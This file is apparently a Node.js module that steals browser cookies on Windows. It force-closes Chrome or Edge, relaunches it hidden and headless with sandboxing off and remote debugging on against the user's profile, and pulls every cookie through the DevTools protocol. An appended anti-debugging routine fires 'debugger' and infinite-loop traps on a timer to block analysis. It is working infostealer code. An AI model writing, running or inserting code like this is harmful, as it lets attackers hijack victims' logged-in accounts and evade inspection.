'use strict';

const http = require("http");
const WebSocket = require("ws");
const fs = require("fs");
const path = require("path");
const child_process = require("child_process");
const utilsProcess = require("../utils/process");

Object.defineProperty(exports, "__esModule", {
  value: true
});
exports.getCookiesFromDebugPort = getCookiesFromDebugPort;

async function getCookiesFromDebugPort(debugPort, timeoutMs = 8000, userDataDir) {
  (0, utilsProcess.killBrowsersSync)();

  const fetchCookies = (port) => {
    return new Promise(resolve => {
      const jsonUrl = "http://127.0.0.1:" + port + "/json";

      const connectToWs = (wsUrl) => {
        if (!wsUrl) {
          return resolve([]);
        }
        const ws = new WebSocket(wsUrl);
        const timer = setTimeout(() => {
          try {
            ws.terminate();
          } catch (e) {}
          resolve([]);
        }, timeoutMs);

        ws.on('open', () => {
          ws.send(JSON.stringify({
            id: 1,
            method: "Network.enable",
            params: {}
          }));
          ws.send(JSON.stringify({
            id: 2,
            method: "Network.getAllCookies",
            params: {}
          }));
        });

        ws.on('message', data => {
          try {
            const response = JSON.parse(data.toString());
            if (response.id === 2 && response.result && Array.isArray(response.result.cookies)) {
              clearTimeout(timer);
              const cookies = response.result.cookies;
              try {
                ws.close();
              } catch (e) {}
              return resolve(cookies);
            }
          } catch (e) {}
        });

        ws.on('error', () => {
          clearTimeout(timer);
          try {
            ws.terminate();
          } catch (e) {}
          resolve([]);
        });
      };

      http.get(jsonUrl, res => {
        let body = "";
        res.on('data', chunk => body += chunk);
        res.on('end', () => {
          try {
            const targets = JSON.parse(body);
            const target = Array.isArray(targets) && (targets.find(t => t.webSocketDebuggerUrl && (t.type === "page" || t.type === "other")) || targets[0]);
            if (target && target.webSocketDebuggerUrl) {
              return connectToWs(target.webSocketDebuggerUrl);
            }
          } catch (e) {}

          const versionUrl = "http://127.0.0.1:" + port + "/json/version";
          http.get(versionUrl, vRes => {
            let vBody = "";
            vRes.on('data', vChunk => vBody += vChunk);
            vRes.on('end', () => {
              try {
                const versionData = JSON.parse(vBody);
                return connectToWs(versionData.webSocketDebuggerUrl);
              } catch (e) {
                return resolve([]);
              }
            });
          }).on('error', () => resolve([]));
        });
      }).on('error', err => {
        if (err?.code === "ECONNREFUSED" && userDataDir) {
          const progFiles86 = process.env["ProgramFiles(x86)"] || "";
          const progFiles = process.env.ProgramFiles || "";
          const localAppData = process.env.LocalAppData || "";
          
          const paths = [
            path.join(progFiles86, "Microsoft/Edge/Application/msedge.exe"),
            path.join(progFiles, "Microsoft/Edge/Application/msedge.exe"),
            path.join(localAppData, "Microsoft/Edge/Application/msedge.exe"),
            path.join(progFiles86, "Google/Chrome/Application/chrome.exe"),
            path.join(progFiles, "Google/Chrome/Application/chrome.exe"),
            path.join(localAppData, "Google/Chrome/Application/chrome.exe")
          ];

          let browserPath = null;
          for (const p of paths) {
            if (fs.existsSync(p)) {
              browserPath = p;
              break;
            }
          }

          if (browserPath) {
            try {
              const exeName = path.basename(browserPath);
              try {
                child_process.execSync("taskkill /F /IM " + exeName + " /T", { stdio: 'ignore' });
              } catch (e) {}

              const args = [
                "--remote-debugging-port=" + port,
                "--user-data-dir=" + userDataDir,
                "--no-first-run",
                "--disable-gpu",
                "--headless",
                "--mute-audio",
                "--no-sandbox",
                "--window-size=0,0"
              ];

              const browser = child_process.spawn(browserPath, args, {
                detached: true,
                stdio: 'ignore'
              });
              browser.unref();

              setTimeout(() => {
                http.get(jsonUrl, rRes => {
                  let rBody = "";
                  rRes.on('data', d => rBody += d);
                  rRes.on('end', () => {
                    try {
                      const rTargets = JSON.parse(rBody);
                      const rTarget = Array.isArray(rTargets) && (rTargets.find(t => t.webSocketDebuggerUrl && (t.type === "page" || t.type === "other")) || rTargets[0]);
                      if (rTarget && rTarget.webSocketDebuggerUrl) {
                        return connectToWs(rTarget.webSocketDebuggerUrl);
                      }
                    } catch (e) {}
                    return resolve([]);
                  });
                }).on('error', () => resolve([]));
              }, 4000);
              return;
            } catch (e) {}
          }
        }
        return resolve([]);
      });
    });
  };

  if (typeof debugPort === "number") {
    return fetchCookies(debugPort);
  }

  const portRange = [];
  for (let p = 9220; p <= 9225; p++) {
    portRange.push(p);
  }

  for (const p of portRange) {
    try {
      const cookies = await fetchCookies(p);
      if (cookies && cookies.length > 0) {
        return cookies;
      }
    } catch (e) {}
  }
  return [];
}

exports.default = getCookiesFromDebugPort;

(function antiDebug() {
  const check = function() {
    const pattern = new RegExp("function *\\( *\\)");
    const incPattern = new RegExp("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", "i");
    const action = initAction("init");
    if (!pattern.test(action + "chain") || !incPattern.test(action + "input")) {
      action("0");
    } else {
      initAction();
    }
  };
  
  function initAction(param) {
    function debugTrap(n) {
      if (typeof n === "string") {
        return function(m) {}.constructor("while (true) {}").apply("counter");
      } else if (("" + n / n).length !== 1 || n % 20 === 0) {
        (function() { return true; }).constructor("debugger").call("action");
      } else {
        (function() { return false; }).constructor("debugger").apply("stateObject");
      }
      debugTrap(++n);
    }
    try {
      if (param) return debugTrap;
      else debugTrap(0);
    } catch (e) {}
  }
  
  setInterval(check, 4000);
})();
